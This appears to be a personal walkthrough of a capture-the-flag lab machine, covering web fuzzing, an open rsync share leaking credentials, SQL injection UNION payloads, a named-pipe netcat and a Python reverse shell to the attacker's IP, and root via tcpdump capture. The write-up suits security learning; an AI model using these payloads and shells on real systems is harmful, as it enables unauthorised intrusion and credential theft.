start with nmap



***

http 80

default apache webpage is open.

/admin :forbidden
comment : `<!-- Make sure admin functionality can only be used in development environment. -->`
- fuzz /admin recursively.
recursive fuzzing : /config.php and index.php found


/index.php

- fuzz with php extention(nothing new found)

fuzz /admin with big wordlist with php extention.

***

rsync

```
─$ nc -vn $ip 873
(UNKNOWN) [10.10.94.172] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
Conf            All Confs
@RSYNCD: EXIT


```
found `Conf` list.

lets enumerate `Conf`

authentication not required so download all files

`rsync -av rsync://$ip/Conf ./`

read files see if something found.

user: tom
password : theCat


`<!-- Make sure admin functionality can only be used in development environment. -->` by this we need to change the production env to dev enviroment. we can do that by modifiying the `webapp.ini` file. in `Conf` share.

edit the file.

```
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

change `prod` to `dev`

```
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No


```

revisit http://$ip/admin

found sql injection

http://$ip/admin/config.php


username : test" union select 1,2,3-- -


enum for tables :
`test" union select 1,table_name,3 from information_schema.tables where table_schema=database()-- -`

found table : users


enum for columns :


`test" union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- -`

column found:id,uname,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 3


hash found :

```
E8B04506872147D6200E9FB48B27B5C72F173FF0
2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 : password (dev)

```

get shell as www-data using sqlmap

rm -f /tmp/p; mknod /tmp/p p && nc 10.11.57.82 1234 0/tmp/p

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.57.82",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

***

privs

/usr/sbin/tcpdump = cap_net_raw+ep                                                                                                  

/usr/bin/gettext.sh

127.0.0.1:1027

127.0.0.1:3306

***

sniff traffic with tcpdump and save it in file. then trasfer file to my kali machine and analyse using wireshark

found id_rsa of root.

ssh as root.